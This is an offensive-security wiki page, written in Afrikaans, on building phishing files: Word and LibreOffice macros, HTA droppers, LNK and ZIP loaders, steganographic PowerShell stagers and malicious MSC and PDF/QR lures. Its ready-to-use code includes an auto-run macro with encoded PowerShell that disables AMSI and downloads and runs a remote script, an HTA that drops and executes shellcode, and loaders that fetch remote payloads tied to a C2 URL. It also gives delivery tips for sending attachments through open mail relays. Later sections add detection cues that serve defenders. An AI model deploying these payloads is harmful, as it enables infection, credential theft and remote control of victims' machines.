# Phishing-lêers en dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word voer lêerdatavalidering uit voordat ’n lêer oopgemaak word. Datavalidering word uitgevoer deur die datastruktuur teen die OfficeOpenXML-standaard te identifiseer. As daar tydens die identifisering van die datastruktuur ’n fout voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die macro-uitvoeringsvermoë te behou.\
Byvoorbeeld, ’n RTF-lêer ondersteun nie macros nie, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer kan word en sal macros kan uitvoer.\
Dieselfde interne werking en meganismes geld vir al die sagteware in die Microsoft Office Suite (Excel, PowerPoint, ens.).

Jy kan die volgende opdrag gebruik om na te gaan watter uitbreidings deur sekere Office-programme uitgevoer gaan word:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-lêers wat na ’n afgeleë template verwys (Lêer –Opsies –Byvoegings –Bestuur: Templates –Gaan) wat macros bevat, kan ook macros “uitvoer”.

### Laai eksterne beeld

Gaan na: _Invoeg --> Vinnige dele --> Veld_\
_**Kategorieë**: Skakels en verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://<ip>/whatever

![Office Documents - Laai eksterne beeld: Gaan na: Invoeg -- Vinnige dele -- Veld](<../../images/image (155).png>)

Vir die ontleding van ’n ontvangde dokument eerder as om een saam te stel, sien [VBA-makro-ontleding: rommelkode en UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Makro-agterdeur

Dit is moontlik om macros te gebruik om arbitrêre kode vanuit die dokument uit te voer.

#### Outolaai-funksies

Hoe algemener hulle is, hoe groter is die waarskynlikheid dat die AV dit sal opspoor.

- AutoOpen()
- Document_Open()

#### Voorbeelde van makrokode

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**. Dit maak die Document Inspector oop. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer jy klaar is, kies die **Save as type**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
Doen dit omdat jy **nie makro's in 'n `.docx` kan stoor nie** en daar 'n **stigma** **rondom** die makro-geaktiveerde **`.docm`**-uitbreiding is (bv. die kleinkoonprentjie het 'n groot `!` en sommige web-/e-posgateways blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.

#### Kwaadwillige makrogenerators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT-outomatiese makro's (Basic)

LibreOffice Writer-dokumente kan Basic-makro's insluit en dit outomaties laat uitvoer wanneer die lêer oopgemaak word deur die makro aan die **Open Document**-gebeurtenis te koppel (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-makro lyk so:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Let op die verdubbelde aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik hulle om letterlike aanhalingstekens te ontsnap, dus bly payloads wat eindig op `...==""")` die innerlike opdrag en die Shell-argument gebalanseerd.

Afleweringswenke:

- Stoor as `.odt` en bind die makro aan die dokumentgebeurtenis sodat dit onmiddellik uitvoer wanneer die dokument oopgemaak word.
- Wanneer jy met `swaks` e-pos stuur, gebruik `--attach @resume.odt` (die `@` is nodig sodat die lêerinhoud, nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is van kritieke belang wanneer jy SMTP-bedieners misbruik wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA-lêers

’n HTA is ’n Windows-program wat **HTML en skriftale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en voer as ’n “volledig vertroude” toepassing uit, sonder die beperkings van ’n blaaier se sekuriteitsmodel.

’n HTA word met **`mshta.exe`** uitgevoer, wat gewoonlik saam met **Internet Explorer** **geïnstalleer** word, wat beteken dat **`mshta` van IE afhanklik is**. As dit dus verwyder is, sal HTA’s nie kan uitvoer nie.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Vervalste aanhegselkaarte in HTML-e-pos

’n HTML-e-pos kan ’n diensverskaffer se inheemse voorskoukaart vir aanhegsels naboots in plaas daarvan om ’n werklike aanhegsel te bevat. Talos het ’n Gmail-kaart waargeneem wat uit vier Base64-gekodeerde PNG MIME-dele herbou is. Die volledige visuele element is in een anker toegedraai, en ’n ontvangerwaarde in `?m=<target-id>` het opsporing per ontvanger moontlik gemaak. Die skakel het met `//` begin, eerder as `http://` of `https://`; blaaiers los daardie protokolrelatiewe vorm op, maar URL-ekstrakteerders wat net volledig gekwalifiseerde URL’s herken, kan dit mis.<sup>[[11]](#references)</sup>

Inspekteer tydens ontleding die rou MIME eerder as om die weergegewe lys van aanhegsels te vertrou. Herbou hoe die inlyn-prentdele die visuele kaart vorm, identifiseer die omringende anker en normaliseer protokolrelatiewe `href`-waardes voordat URL’s onttrek word.<sup>[[11]](#references)</sup>

Vir toetsing van vervalsing van die sender in die koevert/kopstuk en DMARC-belyning, sien [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Dwing NTLM-verifikasie af

Daar is verskeie maniere om NTLM-verifikasie “op afstand” af te dwing. Jy kan byvoorbeeld onsigbare prente by e-posse of HTML voeg waartoe die gebruiker toegang sal kry (selfs HTTP MitM?). Of stuur die slagoffer die adres van lêers wat verifikasie sal aktiveer bloot deur die vouer oop te maak.

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die verifikasie kan steel nie, maar ook **NTLM relay-aanvalle kan uitvoer**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK na `ftp.exe`-plaaslike opdrag-stadiëring

’n Kortpad kan `ftp.exe -s:icon.ico` begin met ’n teksopdraglêer wat deur ’n prentuitbreiding vermom word.<sup>[[12]](#references)</sup> Die `-s:`-opsie lees plaaslike FTP-opdragte; op Windows 8 en later moet daardie lêer UTF-8-gekodeer wees.<sup>[[13]](#references)</sup> ’n Reël wat met `!` begin, voer ’n plaaslike opdrag deur `cmd /c` uit, sonder om daardie opdrag na ’n FTP-bediener te stuur. ’n FTP-verbinding is nie nodig vir hierdie plaaslike uitvoeringspad nie.<sup>[[14]](#references)</sup> In die gerapporteerde ketting het die FTP-skrip ’n tweede opdraglêer bereik. Die volledige `!`-reël is belangrik: `!more res.ico` alleen vertoon die lêer, terwyl ’n pyp na `cmd` die inhoud daarvan uitvoer.<sup>[[12]](#references)[[14]](#references)</sup>

Dieselfde ketting het ’n herhalende taak gebruik om ’n skryfbare opdraglêer weer te lees, in plaas daarvan om vir elke opdatering ’n nuwe uitvoerbare lêer te installeer. Die taakaksie was `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; die lêer het ’n opdrag bevat wat instruksies gaan haal het wanneer dit uitgevoer is. ’n Verwante variant het ’n vervangende opdraglêer afgelaai voor ’n geskeduleerde uitvoering. Die lêer moet teenwoordig en leesbaar wees wanneer die taak afgaan; `conhost` verhoog nie die taak se voorregte bo dié van sy gekonfigureerde gebruikerstoken nie.<sup>[[12]](#references)</sup> Sien [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md) vir taakmeganika.

## VHDX-kortpad met versteekte MSI en lokdokument

’n Gemonteerde VHDX kan ’n sigbare LNK vertoon terwyl ’n MSI en ’n loksigblad in dieselfde volume versteek bly. In die gerapporteerde ketting het die LNK `cmd.exe /c Visa_Details.msi & Attachment-2.xls` gebruik. Die `&`-skeidingsteken maak die lokdokument oop, selfs al misluk die installeerderopdrag; die oopmaak van die dokument bewys nie dat die installasie suksesvol was nie. Dit is ’n afleweringsvariant van [MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), nie op sigself ’n MSI-voorregte-escalasie nie.<sup>[[12]](#references)</sup>

Vir hierdie MSI kombineer `CustomAction.Type` **194** ’n EXE wat in die `Binary`-tabel (**2**) gestoor is met vlae vir ignore-return-code (**64**) en asynchronous (**128**). Die kombinasie **64 + 128** beteken dat Windows Installer nie wag dat die EXE klaar loop nie; die 128-vlag alleen sou aan die einde van die volgorde wag.<sup>[[15]](#references)[[16]](#references)</sup> Kontroleer die aksie se `Source` teen die `Binary`-tabel en sy posisie in `InstallExecuteSequence` voordat jy uitvoering aan daardie ingebedde EXE toeskryf.<sup>[[12]](#references)[[15]](#references)</sup> ’n [WebDAV UNC path can deliver a remote MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), maar dit is ’n ander toegangspunt.

## LNK-laaiers + ZIP-ingebedde loonvragte (lêerlose ketting)

Hoogs effektiewe veldtogte lewer ’n ZIP af wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-laaier ná ’n unieke merker in die rou grepe van die ZIP gestoor is, en dat die .lnk dit uitsny en volledig in die geheue uitvoer.<sup>[[2]](#references)</sup>

Tipiese vloei wat deur die .lnk se PowerShell-eenreëlopdrag geïmplementeer word:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouergids van die huidige werkgids.
2) Lees die ZIP-grepe en vind ’n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell-loonvrag.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit en maak die lok-.docx oop om wettig voor te kom.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Dekodeer die volgende stadium (bv. verwyder alle #-karakters) en voer dit in die geheue uit.

Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te sny en uit te voer:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Aantekeninge
- Aflewering misbruik dikwels subdomeine van betroubare PaaS-platforms (bv. *.herokuapp.com) en kan payloads agter ’n hek plaas (bedien onskadelike ZIP-lêers op grond van IP/UA).
- Die volgende stadium dekripteer gereeld base64/XOR-shellcode en voer dit via Reflection.Emit + VirtualAlloc uit om skyfspore te beperk.

Persistence wat in dieselfde ketting gebruik word
- COM TypeLib-kaping van die Microsoft Web Browser-beheerder, sodat IE/Explorer of enige app wat dit insluit die payload outomaties weer begin loods.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Opsporing/IOCs
- ZIP-lêers met die ASCII-merkerstring (bv. xFIQCV) wat by die argiefdata gevoeg is.
- .lnk wat deur ouer-/gebruikersvouers soek om die ZIP op te spoor en ’n lokdokument oopmaak.
- AMSI-peutering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang besigheids-e-poskettings wat eindig met skakels wat onder betroubare PaaS-domeine gehuisves word.

## LNK-lokdokument-eerste staging → scheduled-task persistence → trusted CPL side-loading

Nog ’n herhalende patroon is ’n **dokumentnabootsende `.lnk`** wat onmiddellik ’n onskadelike lokdokument oopmaak terwyl die werklike ketting op die agtergrond gereedgemaak word.<sup>[[3]](#references)</sup>

Waargenome werkvloei:
1. Die kortpad **vermom hom as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke proxy om ’n verdoeselde PowerShell-aflaaier te begin.
2. Die PowerShell fragmenteer voor die hand liggende tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodat naïewe opsporing wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag miskyk.
3. Die stager laai **eers die lokdokument af**, maak dit vir die slagoffer oop en rekonstrueer dan die kwaadwillige lêers op die agtergrond.
4. Payloads kan met **rommeluitbreidings** geskryf word en dan hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe`-/.cpl-lêers vertraag.
5. Persistence word gevestig met ’n **geskeduleerde taak wat elke minuut loop** en ’n vertroude gasheerbinêre lêer vanaf ’n pad wat deur die gebruiker geskryf kan word, begin.

Minimale opsporingsleidrade vir hierdie patroon:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

’n Nuttige staging-uitleg om te herken, is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` of `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Waarom die tweede stadium stealthy is

In die Rapid7-gevallestudie het die geskeduleerde taak **`Fondue.exe`** herhaaldelik vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan geplaas is en **`RunFODW`** uitgevoer het, het die betroubare Microsoft-binêre die aanvaller se CPL geside-load in plaas van die wettige stelselkopie.

Die CPL:
- Lees ’n **AES-256-CBC**-blob vanaf `C:\Windows\Tasks\editor.dat`
- De-kripteer dit deur **Windows CNG / `bcrypt.dll`**
- Ken uitvoerbare geheue toe en kopieer die gede-kripteerde shellcode daarna
- Voer dit indirek uit deur die shellcode-wyser as die terugroepfunksie vir **`EnumUILanguagesW`** te gebruik

Daardie laaste stap is die moeite werd om afsonderlik na te soek: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **wettige WinAPI wat ’n terugroepfunksie aanvaar** om uitvoering oor te dra.

Die gede-kripteerde payload in hierdie veldtog was **Donut**-shellcode, wat toe die finale PE volledig in geheue gekarteer het en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat dit uitvoering oorgedra het. Vir meer besonderhede oor side-loading en geheue-inwonende naverwerking, sien:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktiese soekpunte:
- `.lnk` wat `powershell.exe` of `conhost.exe` loods, gevolg deur ’n sigbare lokdokument.
- Kortstondige aflaaie na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf nonsens-uitbreidings.
- Geskeduleerde take met onopvallende name soos `GoogleErrorReport` wat vanaf **gebruiker-skryfbare gidse** uitgevoer word.
- Betroubare binêre lêers wat **`.cpl` / `.dll`**-lêers uit dieselfde nie-stelselgids laai.
- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en daarna deur die side-loaded module gelees word.

## Payloads in beelde wat deur Steganography-afbakenings gemerk is (PowerShell-stager)

Onlangse loader-kettings lewer ’n verduisterde JavaScript/VBS wat ’n Base64 PowerShell-stager dekodeer en uitvoer. Daardie stager laai ’n beeld af (dikwels ’n GIF) wat ’n Base64-geënkodeerde .NET DLL as gewone teks tussen unieke begin- en eindmerkers versteek. Die script soek na hierdie afbakenings (voorbeelde wat in die natuur gesien is: «<<sudo_png>> … <<sudo_odt>>>»), haal die teks tussenin uit, Base64-dekodeer dit na grepe, laai die assembly in geheue en roep ’n bekende intree-metode aan met die C2-URL.<sup>[[5]](#references)</sup>

Werksvloei
- Stadium 1: Geargiveerde JS/VBS-dropper → dekodeer ingebedde Base64 → loods PowerShell-stager met -nop -w hidden -ep bypass.
- Stadium 2: PowerShell-stager → laai beeld af, haal Base64 uit wat deur merkers afgebaken is, laai die .NET DLL in geheue en roep sy metode aan (bv. VAI) met die C2-URL en opsies as argumente.
- Stadium 3: Loader haal die finale payload op en spuit dit tipies in via process hollowing in ’n betroubare binêre lêer (gewoonlik MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Lees hier meer oor process hollowing en die uitvoering van ’n proxy via ’n betroubare nutsprogram:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om ’n DLL uit ’n beeld te haal en ’n .NET-metode in geheue aan te roep:

<details>
<summary>PowerShell-stego-payload-uittrekker en loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Dit is ATT&CK T1027.003 (steganografie/merkerverberging).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
- AMSI/ETW-bypass en string-deobfuskering word gewoonlik toegepas voordat die assembly gelaai word.
- Opsporing: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell wat toegang tot beelde verkry en Base64-blokke onmiddellik dekodeer.

Sien ook stego-nutsgoed en carving-tegnieke:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-droppers → Base64 PowerShell-staging

’n Terugkerende aanvanklike stadium is ’n klein, sterk verduisterde `.js`- of `.vbs`-lêer wat binne ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te begin.<sup>[[5]](#references)</sup>

Skematiese logika (abstrak):
- Lees die inhoud van die eie lêer
- Soek ’n Base64-blok tussen rommelstringe
- Dekodeer na ASCII PowerShell
- Voer uit deur `wscript.exe`/`cscript.exe` te gebruik om `powershell.exe` aan te roep

Opsporingsleidrade
- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker se tydelike paaie begin.

## MSC-dokumente as uitvoeringshouers (GrimResource)

Microsoft Management Console-lêers (`.msc`) is XML-konsoledefinisies wat gewoonlik met `mmc.exe` oopgemaak word. **GrimResource** wapen ’n `StringTable`-verwysing na ’n `apds.dll`-hulpbron met ’n ou XSS-primitief, sodat JavaScript binne `mmc.exe` loop wanneer ’n gebruiker die vervaardigde konsole oopmaak. Waargenome monsters het `transformNode`-gebaseerde verduistering met **DotNetToJScript** gekombineer om ’n .NET-loonvrag te instansieer sonder die gewone Office-makropaadjie.<sup>[[9]](#references)</sup>

Vir statiese triage, behandel ’n onvertroude MSC as teks en moet dit **nie** dubbelklik nie:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Aanwysers met ’n hoë seinwaarde tydens runtime is wanneer `mmc.exe` die CLR- of scriptkomponente laai, netwerkverbindings maak, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer begin. Die formaat is legitiem, dus moet detections **oorsprong + verdagte XML-/scriptinhoud + `mmc.exe`-gedrag** korreleer in plaas daarvan om elke MSC te blokkeer.<sup>[[9]](#references)</sup>

## PDF-/QR-aanstuurlêers en payload-beheer

’n PDF hoef nie ’n exploit te bevat om nuttig te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, lei die blaaiersessie weg van e-posbeheermaatreëls en verpersoonlik die bestemming met die ontvanger se e-posadres. Microsoft het in 2025 PDF’s gedokumenteer waarvan die QR-URL’s uniek per ontvanger was en na RaccoonO365-infrastruktuur vir die oes van aanmeldbewyse gelei het; ’n parallelle ketting het IP-/omgewingsbeheer gebruik om ’n JavaScript-/MSI-pad aan uitgesoekte besoekers terug te gee, maar ’n onskuldige PDF aan skandeerders of kliënte wat nie toegelaat is nie.<sup>[[10]](#references)</sup>

Triageer beide PDF-aksies en gerenderde QR-kodes. ’n QR-kode kan as vektorgrafika geteken wees eerder as as ’n onttrekbare prent gestoor word, daarom moet elke bladsy gerasteriseer word, benewens die onttrekking van ingebedde prente:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspekteer gedekodeerde bestemmings en herleidings vanaf ’n geïsoleerde ontledingstelsel sonder om te verifieer. Nuttige soekkenmerke sluit in QR-kode-PDF’s met byna leë e-posboodskappe, die ontvanger se e-posadres wat in ’n navraagparameter ingebed is, verskeie herleidings deur betroubare gasheerdienste en verskillende inhoud wat teruggestuur word volgens IP-adres, geoligging, koekies, verwysingsbron of user agent. Vergelyk versoeke met beheerde profiele, want ’n enkele sandbox-opvraging kan slegs die lokmiddel ontvang.<sup>[[10]](#references)</sup>

## Windows-lêers om NTLM-hashes te steel

Kyk na die bladsy oor **plekke om NTLM-bewyse te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-veldtog: ’n gesofistikeerde phishing-aanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Opsporing van Dropping Elephant se handelswyses deur ’n loader-ketting met ’n China-tema](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Kaping van die TypeLib – Nuwe COM-persistensietegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader lewer ’n reeks infostealers af](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console vir aanvanklike toegang en ontduiking](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedreigingsrolspelers buit belastingseisoen uit om belastingverwante phishing-veldtogte te ontplooi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587-afleweringsketting en Antino-agterdeur](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER brei sy arsenaal uit met PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - ftp-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Pasgemaakte aksietipe 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Verwerkingsopsies vir die terugkeerwaarde van pasgemaakte aksies](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
